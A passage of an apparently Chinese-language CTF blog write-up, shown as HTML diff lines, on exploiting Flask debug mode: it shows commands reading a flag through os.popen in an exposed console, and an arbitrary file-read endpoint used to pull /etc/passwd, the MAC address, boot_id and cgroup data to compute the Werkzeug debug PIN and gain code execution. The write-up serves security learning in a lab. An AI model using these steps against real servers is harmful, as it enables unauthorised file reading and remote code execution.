+</span></span><span class=line><span class=cl><span class=n>sys</span>
+</span></span><span class=line><span class=cl><span class=n>this_is_the_flag</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>tmp</span>
+</span></span><span class=line><span class=cl><span class=n>usr</span>
+</span></span><span class=line><span class=cl><span class=k>var</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;tac /f*&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;tac /this_is_the_flag.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=n>c5d06b53</span><span class=o>-</span><span class=mi>5</span><span class=n>aae</span><span class=o>-</span><span class=mi>44</span><span class=n>b5</span><span class=o>-</span><span class=n>b805</span><span class=o>-</span><span class=mi>246</span><span class=n>affc80c5f</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=demo2>demo2</h2><p>ctfshow801</p><p>进来看到提示直接报错得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/local/lib/python3.8/site-packages/flask/app.py
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file?filename=/etc/passwd
+</span></span><span class=line><span class=cl>用户为root
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flask.app
+</span></span><span class=line><span class=cl>Flask
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file?filename=/sys/class/net/eth0/address
+</span></span><span class=line><span class=cl>02:42:ac:0c:4e:cd
+</span></span><span class=line><span class=cl>file?filename=/etc/machine-id
+</span></span><span class=line><span class=cl>没有回显
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file?filename=/proc/sys/kernel/random/boot_id
+</span></span><span class=line><span class=cl>225374fa-04bc-4346-9f39-48fa82829ca9
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file?filename=/proc/self/cgroup
+</span></span><span class=line><span class=cl>截取得到
+</span></span><span class=line><span class=cl>738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
+</span></span><span class=line><span class=cl>拼接得到
+</span></span><span class=line><span class=cl>225374fa-04bc-4346-9f39-48fa82829ca9738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python &#34;c:\Users\baozhongqi\Documents\VSCODE\.vscode\python\index.py&#34; -u root -p /usr/local/lib/python3.8/site-packages/flask/app.py -M 02:42:ac:0c:4e:cd -i 225374fa-04bc-4346-9f39-48fa82829ca9738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
+</span></span><span class=line><span class=cl>Md5Pin:  459-927-146
+</span></span><span class=line><span class=cl>Sha1Pin:  109-751-384
+</span></span></code></pre></td></tr></table></div></div><p>这里是<code>python3.8</code>,使用哈希的</p><p>访问<code>console</code>一样的成功RCE</p><h1 id=0x03-小结>0x03 小结</h1><p>调试模式还有这些新奇的姿势，好玩，虽然中途对<code>machine_id</code>有些疑惑但是最后还是成功的明白了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
+<a href=/tags/flask/>Flask</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
